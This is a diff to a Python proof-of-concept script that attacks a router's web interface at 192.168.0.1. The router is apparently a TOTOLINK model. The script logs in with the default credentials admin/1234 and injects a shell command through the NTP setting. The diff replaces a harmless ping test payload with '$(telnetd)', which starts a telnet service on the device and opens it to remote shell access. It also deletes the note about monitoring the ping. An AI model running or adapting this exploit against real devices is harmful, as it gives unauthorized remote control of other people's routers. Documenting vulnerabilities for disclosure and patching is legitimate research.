@@ -5,7 +5,7 @@ import requests, json
 
 USERNAME = 'admin'
 PASSWORD = '1234'
-inject_cmd = "$(ping -c 1 192.168.0.2)"
+inject_cmd = "$(telnetd)"
 
 def toto_login():
     toto_geturl = 'http://192.168.0.1/formLoginAuth.htm?authCode=1&userName='+USERNAME+'&password='+PASSWORD+'&goURL=home.asp&action=login'
@@ -47,9 +47,6 @@ if __name__ == "__main__":
     cookie = toto_login()
     print(cookie)
 
-    ########Start test, please listen icmp on 192.168.0.2########
-
     #Test NTP command injection
     toto_ntp(cookie, inject_cmd)
-
 
